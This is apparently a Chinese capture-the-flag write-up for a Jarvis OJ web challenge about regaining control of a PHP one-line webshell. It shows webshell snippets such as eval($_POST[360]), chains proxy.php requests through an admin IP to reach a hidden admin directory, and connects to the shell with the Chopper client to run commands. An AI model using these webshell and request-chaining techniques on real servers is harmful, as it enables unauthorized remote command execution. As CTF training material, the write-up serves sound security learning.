    小明入侵了一台web服务器并上传了一句话木马，但是，管理员修补了漏洞，更改了权限。更重要的是：他忘记了木马的密码！你能帮助他夺回控制权限吗？

    打开网页，赫然挂着一张菜刀图片，心想终于能用到我的cknife了!
    一开始的思路就是这张菜刀图片就是菜刀连接的地址，赶紧用菜刀以空密码连接一下，无效。

    这个时候发现图片的名称有点奇怪。proxy.php

    我们通过分析题目可以得出，小明上传了一句话木马，而常见的一句话木马一般是以下这种形式:

    eval($_GET[‘url’]);

    或者：echo file_get_contents($_GET[a]);

    结合proxy推断proxy.php可以代理我们的请求。

    构造网页地址:http://web.jarvisoj.com:32782/proxy.php?url=http://web.jarvisoj.com:32782/admin/

    显示you are not admin!
    F12一下，出现提示:<script>alert('admin ip is 202.5.19.128')</script>

    再次构造http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/。

    结合Burpsuite与目录字典，找到网页http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/robots.txt

    wget下载trojan.php.txt。

    保存为chopper.php。在研究了别人的WP之后使用php7.2版本运行之，并不会显示原一句话木马的内容，切换为php5.5版本得到Warning: assert(): Assertion "eval($_POST[360])" failed in /data/lab/4wv8fwzs/index.php on line 5即，eval($_POST[360])。
    菜刀连接，http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/trojan.php，密码为360。即可得到flag。

    或者使用hackbar，POST过去一个360=ls。
